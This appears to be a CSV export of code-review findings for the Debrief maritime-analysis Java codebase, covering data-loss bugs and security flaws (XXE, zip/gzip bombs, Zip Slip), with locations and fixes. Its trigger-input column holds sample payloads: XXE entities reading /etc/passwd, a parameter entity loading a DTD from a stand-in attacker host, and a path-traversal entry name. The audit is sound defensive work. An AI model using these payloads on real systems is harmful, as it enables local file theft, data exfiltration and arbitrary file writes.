id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-005,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,bug,silent-data-loss,High,High,candidate,"readThisDouble accepts partial numbers, maps NaN to 0, and attribute parse er...","readThisDouble() uses DecimalFormat.parse(), which parses only the longest valid prefix and ignores the remainder, so '1.2E1' becomes 1.2, '12abc' becomes 12 and exponent-notation values written by other tools are silently truncated; 'NaN' is silently turned into 0 (course north). When parsing does fail, HandleDoubleAttribute/HandleDateTimeAttribute and handleOurselves() catch the exception, log it to the trace file and continue, so the attribute silently keeps its default (0, previous value or null) and the user sees a complete-looking plot with wrong numbers. All Debrief/ASSET XML numeric attributes go through this path.",L79-L86; L96-L104; L222-L241; L434-L443,"<fix Course=""9.0E1"" Speed=""1.2E1"" .../> in a .dpf: imported with course 9 deg and speed 1.2 kts instead of 90 deg and 12 kts, no user-visible warning",Use ParsePosition and reject input with unconsumed characters (or Double.parseDouble after normalising the decimal separator); accumulate attribute errors and surface them to the user at end of import instead of trace-only logging.,M,Required knowing DecimalFormat's prefix-parse semantics and following how the handler base class swallows exceptions; not detectable by grep.,-,
CR-006,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReaderWriter,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReaderWriter.java,security,xxe,High,High,candidate,SAX parser for .dpf/.xml/.asf import resolves external entities and DTDs,"getConfiguredParser() returns SAXParserFactory.newInstance().newSAXParser() with no hardening: disallow-doctype-decl, external-general-entities, external-parameter-entities and load-external-dtd are all left at JDK defaults (enabled), and the hardening lines are commented out. Every Debrief plot (.dpf/.xml), ASSET scenario/control file (.asf) and NaturalEarth store goes through doImport(), so a crafted file can read local files into attribute values and exfiltrate them via a parameter-entity SYSTEM URL, or make the parser fetch arbitrary URLs. Entity-expansion bombs are bounded only by the JDK's default jdk.xml limits since FEATURE_SECURE_PROCESSING is never set explicitly.",L86-L103; L157-L163,".dpf beginning <!DOCTYPE plot [<!ENTITY % p SYSTEM ""http://attacker/x.dtd""> %p;]> or <!ENTITY xxe SYSTEM ""file:///etc/passwd""> used inside a Label attribute","In getConfiguredParser set factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true), http://apache.org/xml/features/disallow-doctype-decl=true (or the two external-entities features false and load-external-dtd false) and set an EntityResolver that rejects external ids; do the same for ASSETReaderWriter which reuses doImport.",S,"grep-able for the factory call, but confirming that every importer (Debrief plot, ASSET, NaturalEarth) funnels through this one unhardened doImport needed tracing the class hierarchy.",CWE-611,
CR-007,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,ShortLocationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/ShortLocationHandler.java,bug,silent-data-loss,High,High,candidate,"Unparseable Lat/Long silently produces a position at 0,0","handleOurselves() resets _lat/_long/_depth to 0.0 then parses each attribute; a ParseException is caught and only traced, so elementClosed() still builds a WorldLocation, placing the fix/shape on the equator/prime meridian with no user warning. Combined with readThisDouble's prefix parsing, values such as '5.0E1' silently become 5.0 degrees.",L54-L74; L46-L50,"<shortLocation Lat=""N50.5"" Long=""-1.2"" Depth=""0""/> loads as latitude 0.0",Track parse failure and skip the element (or throw) instead of emitting a default location; report to the user.,S,Needs reading the reset-then-parse-then-construct sequence across two methods.,-,
CR-008,A1+A10,org.mwc.debrief.core,org.mwc.debrief.core.loaders,GpxUtil,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/GpxUtil.java,security,xxe,High,High,candidate,GPX import via JDOM SAXBuilder and schema Validator with default entity handling,"getDocumentSource() parses the GPX file with new SAXBuilder() (JDOM default: expandEntities=true, external entities resolved) and isValid() re-parses the file with a javax.xml.validation Validator that is also left at defaults. Both are reached from JaxbGpxHelper.unmarshall() for every .gpx opened, so a GPX file can trigger XXE twice. || getDocumentSource builds the GPX document with new SAXBuilder() and no feature hardening, so external general/parameter entities and external DTDs are resolved before schema validation runs (validation happens afterwards on the already-expanded JDOM tree). Entity content flows into track/waypoint names via JAXB unmarshalling, giving local file disclosure and SSRF-style outbound requests from a data file.",L64-L72; L86-L91; L101-L118; L120-L140; L137-L140 (JaxbGpxHelper.unmarshall consumes the source),".gpx with <!DOCTYPE gpx [<!ENTITY x SYSTEM ""file:///etc/passwd"">]><gpx version=""1.1""><trk><name>&x;</name>...",Create SAXBuilder(XMLReaders.NONVALIDATING) and set the external-entity/doctype features false; on the Validator set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to empty strings.,S,Needed to know JDOM's default entity behaviour and follow the call chain from JaxbGpxHelper to see the file is parsed twice.,CWE-611,
CR-009,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,security,xxe,High,High,candidate,KML/KMZ DOM parse uses unhardened DocumentBuilderFactory,"doImport() builds a DocumentBuilderFactory with defaults and parses the whole (untrusted) KML text with loader.parse(); doctype declarations and external general/parameter entities are allowed, so a KML or the .kml entry of a KMZ can read local files or make network requests. The pre-pass stripNonValidXMLCharacters does nothing to entities.",L157-L173,".kml containing <!DOCTYPE kml [<!ENTITY x SYSTEM ""file:///etc/hostname"">]> and <name>&x;</name> inside a Placemark","Set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, setExpandEntityReferences(false) and setXIncludeAware(false) on the factory.",S,grep-able,CWE-611,
CR-010,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,null-deref,High,High,candidate,KML import assumes a fixed radar-plot layout; any other KML throws unchecked ...,"For every Placemark with a MultiGeometry the code calls getElementsByTagName(...).item(0).getTextContent() for name/when/coordinates/description without null checks, Integer.parseInt on the first '-' token of the name, indexes coords[2], and substring(startI+7,endI-1) in courseFrom/speedFrom; the LineString branch does fileName.substring(1,len-1) and StringTokenizer.nextToken() three times per point. NPE/NumberFormatException/ArrayIndexOutOfBounds/NoSuchElementException are not in the catch list (L256-L264), so they escape doImport and doZipImport uncaught. Also getElementsByTagName never returns null so the lineString != null test is always true.",L195-L212; L217-L223; L226-L230; L246-L247; L336-L338; L256-L264,"Any Google-Earth KML whose Placemark has a MultiGeometry but a <name> of 'Ship A' or coordinates 'lon,lat' without altitude; or a KML with 2 coordinate tokens per point","Null-check each lookup, validate token counts, catch RuntimeException per Placemark and report a summary to the user.",M,"Needs understanding of DOM API semantics (item(0) null, getElementsByTagName non-null) and the exception flow.",-,
CR-011,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,security,zip-bomb,High,High,candidate,KMZ entries inflated fully into memory with no size cap,"doZipImport() copies every '*.kml' entry byte-by-byte into a ByteArrayOutputStream with no limit on inflated size or entry count, then doImport() re-materialises it as a String (2 bytes/char) plus a stripped copy and a DOM, so peak memory is 5-6x the inflated size. A small KMZ with a highly compressible KML entry exhausts the JVM heap (OutOfMemoryError) and takes down the workbench job. Reached through KMLLoader for any *.kmz opened or dropped.",L284-L298; L306-L318; org.mwc.debrief.core KMLLoader.java L45,A 1 MB .kmz containing a.kml that inflates to 2 GB of spaces/comments.,Track bytes read per entry and abort above a budget (e.g. 256 MB); stream the entry straight into the SAX/DOM parser instead of buffering; use a buffered read(byte[]) loop.,S,Needed to follow the multiple in-memory copies across doZipImport/inputStreamAsString/stripNonValidXMLCharacters to size the amplification.,-,
CR-012,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.csv_gz,Import_CSV_GZ,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/csv_gz/Import_CSV_GZ.java,security,zip-bomb,High,High,candidate,GZIP payload inflated fully into memory with no cap (gzip bomb),"doZipImport() reads the entire GZIPInputStream one byte at a time into a ByteArrayOutputStream before parsing. gzip compresses runs ~1000:1, so a 10 MB .csv.gz can inflate to ~10 GB and OOM the workbench; the byte-at-a-time loop also makes legitimate multi-hundred-MB files extremely slow. On exception the GZIPInputStream is not closed and the failure is only printStackTrace()d.",L1274-L1295; org.mwc.debrief.core CSV_GZ_Loader.java L50,"A small .csv.gz whose payload is gigabytes of repeated characters, opened via the CSV_GZ loader.",Wrap the GZIPInputStream in a BufferedReader and feed doImport() line by line with a running byte budget; never buffer the whole file; close in finally and report errors.,S,grep-able,-,
CR-013,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,algorithm-correctness,time-handling,High,Medium,candidate,Time box labels taken from an arbitrary first track and ignore its stepsToSkip,"createTimeNarrativeShapes() builds the animated time captions from trackData.getTracks().get(0) only (L542) and schedules them from delay 0 (L556) with one step per point (L537, L590). The track list comes from CoreCoordinateRecorder._tracks, a HashMap (order depends on name hashes), so the 'first' track may be one that started late (stepsToSkip>0) or ended early. Its first point's timestamp is then shown at t=0 while the markers for that time appear stepsToSkip*interval later, and no captions exist after the shorter track ends. The exported PPTX shows wrong times for the displayed positions.",L530-L600 (esp. L537; L542; L556); CoreCoordinateRecorder.java L190; L283; L352-L354,Record a PPTX export where track B becomes visible several steps after track A and B hashes before A: the time caption reads B's first DTG while A is still at its earlier positions.,"Keep the recorder's _times list (one DTG per step) in TrackData and generate one caption per step from it, with delay = stepIndex*interval; do not derive captions from a track.",M,Requires following the data flow from the HashMap in the recorder through the exporter to see that ordering and stepsToSkip both change the visible result.,-,
CR-014,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,UnpackFunction,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/UnpackFunction.java,security,zip-slip,High,High,candidate,"PPTX template extracted with zip4j 1.3.2 extractAll, no entry-name canonical ...","unpackFunction() hands the user-selected 'master template' .pptx to net.lingala.zip4j.core.ZipFile.extractAll(). zip4j 1.3.2 (bundled in libs/) predates the Zip Slip fix and writes each entry to outPath + entryName without verifying the canonical path stays under outPath (I inspected the bundled UnzipEngine class: no getCanonicalPath/illegal-name check). Entry names such as ../../../../Users/x/AppData/Roaming/... therefore write arbitrary files. Reached from PrefsPage.updateDimensions() as soon as a template path is typed, from ExportPPTDialog.okPressed() (validateDonorFile) and from every PPTX export.",L67-L68; PlotTracks.java L155; org.mwc.debrief.core PrefsPage.java L182,"A .pptx (zip) whose entry names include ../ segments, e.g. '../../../startup/evil.bat', selected as the PowerPoint master template in Preferences (or distributed as a 'corporate template').","Upgrade zip4j to >= 2.x (API changed) or iterate FileHeaders and reject any entry whose File(outPath,name).getCanonicalPath() does not start with outPath's canonical path before extractFile(). Also cap total extracted size.",M,"Needed to trace that the template path flows from a preference/dialog into a library call, and to check the bundled jar version's UnzipEngine for the missing canonical-path guard.",Zip Slip (Snyk 2018) - zip4j fixed in 1.3.3,
